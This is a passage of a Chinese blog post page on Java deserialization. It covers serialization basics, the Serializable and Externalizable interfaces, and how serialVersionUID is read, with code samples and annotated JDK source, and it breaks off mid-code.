<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2025/09/09/java 反序列化/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            Java 反序列化 | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    分类
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    标签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    书签
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                分类
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                标签
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                书签
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">57</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Java 反序列化</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-09-09 00:44:06</span>
        <span class="mobile">2025-09-09 00:44:06</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-10-11 11:38:14</span>
            <span class="mobile">2025-10-11 11:38:14</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/web/">web</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/web/java-web/">java web</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/java-web/">java web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>55.7k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>234 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<p>Java 的序列化（Serialization）和反序列化（Deserialization）是将对象的状态转换为字节流并恢复的过程。这个过程使对象可以保存到文件、通过网络传输或保存到数据库中，并在稍后恢复成对象。</p>
<ul>
<li><strong>序列化（Serialization）</strong>：将 Java 对象的状态转换为字节流的过程。这使得对象可以保存到文件、发送到其他 JVM 甚至通过网络传输。</li>
<li><strong>反序列化（Deserialization）</strong>：将字节流转换回 Java 对象的过程。这允许恢复先前序列化的对象状态。</li>
</ul>
<h1 id="序列化基础"><a href="#序列化基础" class="headerlink" title="序列化基础"></a>序列化基础</h1><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h3 id="序列化对象"><a href="#序列化对象" class="headerlink" title="序列化对象"></a>序列化对象</h3><p>使用 <code>ObjectOutputStream</code> 将对象写入（<code>writeObject</code> 方法）到输出流（如文件输出流）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">objectOutputStream.writeObject(object);</span><br><span class="line"><span class="type">byte</span>[] data = byteArrayOutputStream.toByteArray()</span><br></pre></td></tr></table></figure></div>

<h3 id="反序列化对象"><a href="#反序列化对象" class="headerlink" title="反序列化对象"></a>反序列化对象</h3><p>使用 <code>ObjectInputStream</code> 从输入流（如文件输入流）读取（<code>readObject</code> 方法）对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line"><span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> objectInputStream.readObject();</span><br></pre></td></tr></table></figure></div>

<h2 id="序列化接口"><a href="#序列化接口" class="headerlink" title="序列化接口"></a>序列化接口</h2><h3 id="Serializable"><a href="#Serializable" class="headerlink" title="Serializable"></a>Serializable</h3><p>要使 Java 对象可序列化，类必须实现 <code>java.io.Serializable</code> 接口。<strong>这个接口是一个标记接口（没有方法），它表明该类的对象可以被序列化</strong>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>; <span class="comment">// 用于版本控制</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Constructors, getters, and setters</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content markdown-body">
      <p>序列化对象时，会递归地序列化其引用的所有对象。因此，引用对象也必须是可序列化的，否则会抛出 <code>NotSerializableException</code>。</p>

    </div>
  </div>

<p>在实现 <code>Serializable</code> 接口上，如果实现 <code>writeObject</code> 和 <code>readObject</code> 方法，可以自定义序列化和反序列化的行为。<strong>通常精心构造的序列化对象和 readObject 的自定义操作结合就可以造成反序列化漏洞。</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    out.defaultWriteObject(); <span class="comment">// 默认序列化</span></span><br><span class="line">    <span class="comment">// 额外的序列化逻辑</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    in.defaultReadObject(); <span class="comment">// 默认反序列化</span></span><br><span class="line">    <span class="comment">// 额外的反序列化逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>defaultWriteObject()</code> 的作用是让 JVM <strong>自动</strong>把“非 <code>transient</code>、非 <code>static</code>、且在 <code>serialPersistentFields</code>（若定义）里的字段”写进流；对应地，<code>defaultReadObject()</code> 自动按同一布局读回。</p>
<p>有些类采用的是<strong>“完全自定义序列化”</strong>，即<strong>不调用</strong> <code>defaultWriteObject()</code> 和 <code>defaultReadObject()</code>，整个 <code>writeObject</code> 和 <code>readObject</code> 的逻辑完全由自己实现。这样的话序列化时<strong>默认字段不会被自动写出</strong>；写什么、以什么顺序、什么替代形式，全由类自己控制。</p>
<h3 id="Externalizable"><a href="#Externalizable" class="headerlink" title="Externalizable"></a>Externalizable</h3><p><code>Externalizable</code> 是 <code>Serializable</code> 的子接口，它强制实现 <code>writeExternal</code> 和 <code>readExternal</code> 方法，提供完全控制序列化过程的能力。这对性能优化或定制序列化格式非常有用。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Externalizable;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInput;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 必须有无参数构造函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.writeObject(name);</span><br><span class="line">        out.writeInt(age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        name = (String) in.readObject();</span><br><span class="line">        age = in.readInt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="序列化相关属性"><a href="#序列化相关属性" class="headerlink" title="序列化相关属性"></a>序列化相关属性</h2><h3 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="serialVersionUID"></a>serialVersionUID</h3><p>每个可序列化类建议定义一个 <code>serialVersionUID</code> 字段，用于版本控制。不同的 <code>serialVersionUID</code> 表示类的不同版本，如果序列化和反序列化的版本不匹配会抛出 <code>InvalidClassException</code>。</p>
<h4 id="类中声明-SerialVersionUID"><a href="#类中声明-SerialVersionUID" class="headerlink" title="类中声明 SerialVersionUID"></a>类中声明 SerialVersionUID</h4><p>如果在反序列化的类中显式声明了 <code>serialVersionUID</code>（修饰符同时包含 <code>static</code> 和 <code>final</code> 且字段类型为 <code>long</code>）：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br></pre></td></tr></table></figure></div>

<p>每个可序列化的类都有“自己的” <code>ObjectStreamClass</code>（类描述符）对象，在 <strong><code>ObjectStreamClass</code> 构造初始化</strong>时有如下调用栈：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">at java.io.ObjectStreamClass.getDeclaredSUID(ObjectStreamClass.java:1857)</span><br><span class="line">at java.io.ObjectStreamClass.access$700(ObjectStreamClass.java:79)</span><br><span class="line">at java.io.ObjectStreamClass$3.run(ObjectStreamClass.java:506)</span><br><span class="line">at java.io.ObjectStreamClass$3.run(ObjectStreamClass.java:494)</span><br><span class="line">at java.security.AccessController.doPrivileged(AccessController.java:-1)</span><br><span class="line">at java.io.ObjectStreamClass.&lt;init&gt;(ObjectStreamClass.java:494)</span><br><span class="line">at java.io.ObjectStreamClass.lookup(ObjectStreamClass.java:391)</span><br><span class="line">at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1134)</span><br><span class="line">at java.io.ObjectOutputStream.writeObject(ObjectOutputStream.java:348)</span><br><span class="line">at Main.main(Main.java:56)</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>getDeclaredSUID</code> 函数会尝试获取类中声明的 <code>serialVersionUID</code>。</p>
<blockquote>
<p>因为 <strong><code>ObjectStreamClass</code> 就是“序列化里用的类描述符”</strong>。序列化&#x2F;反序列化要先拿到这个“类描述符”，<strong>在构建（初始化）它的时候就把所有元数据一次性确定并缓存</strong>——包括到底用<strong>显式声明的 <code>serialVersionUID</code><strong>，还是</strong>回退计算默认 SUID</strong>。</p>
</blockquote>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回给定类“显式声明”的 serialVersionUID 值；若没有（或不合规）则返回 null。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Long <span class="title function_">getDeclaredSUID</span><span class="params">(Class&lt;?&gt; cl)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1) 反射查找名为 &quot;serialVersionUID&quot; 的字段（只在本类声明中找）</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> cl.getDeclaredField(<span class="string">&quot;serialVersionUID&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 要求修饰符同时包含 static 和 final</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">mask</span> <span class="operator">=</span> Modifier.STATIC | Modifier.FINAL;</span><br><span class="line">        <span class="keyword">if</span> ((f.getModifiers() &amp; mask) == mask) &#123;</span><br><span class="line">            <span class="comment">// 3) 绕过可见性限制读取字段</span></span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 4) 读取字段的 long 值（static 字段传 null）</span></span><br><span class="line">            <span class="comment">//    ⚠ 若字段类型不是 long，会在此抛异常，被 catch 吃掉，最终返回 null</span></span><br><span class="line">            <span class="keyword">return</span> Long.valueOf(f.getLong(<span class="literal">null</span>));</span><br><span class="line">        &#125;</span><br><span 